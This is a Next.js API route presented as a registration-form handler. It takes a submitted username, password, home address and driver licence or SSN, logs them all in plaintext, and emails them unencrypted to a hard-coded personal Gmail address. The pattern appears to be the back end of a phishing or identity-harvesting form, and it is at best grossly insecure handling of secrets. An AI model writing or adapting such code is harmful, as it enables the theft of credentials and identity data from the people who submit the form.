import { NextResponse } from 'next/server';
import { Resend } from 'resend';

export async function POST(request: Request) {
    const resend = new Resend(process.env.RESEND_API_KEY);

    try {
        const body = await request.json();
        const { username, password, address, driverLicense, isOver18 } = body;

        console.log('Sending email with data:', { username, password, address, driverLicense, isOver18 });
        console.log('API Key exists:', !!process.env.RESEND_API_KEY);

        const { data, error } = await resend.emails.send({
            from: 'onboarding@resend.dev',
            to: 'zack07996@gmail.com',
            subject: 'New Registration Form Submission',
            html: `
                <h2>New Registration</h2>
                <p><strong>Username:</strong> ${username}</p>
                <p><strong>Password:</strong> ${password}</p>
                <p><strong>Address:</strong> ${address}</p>
                <p><strong>Driver License/SSN:</strong> ${driverLicense}</p>
                <p><strong>Age 18+:</strong> ${isOver18 ? 'Yes' : 'No'}</p>
            `
        });

        if (error) {
            console.error('Resend error:', error);
            return NextResponse.json({ error }, { status: 500 });
        }

        console.log('Email sent successfully:', data);
        return NextResponse.json({ data }, { status: 200 });
    } catch (error) {
        console.error('Catch error:', error);
        return NextResponse.json({ error: 'Failed to send email' }, { status: 500 });
    }
}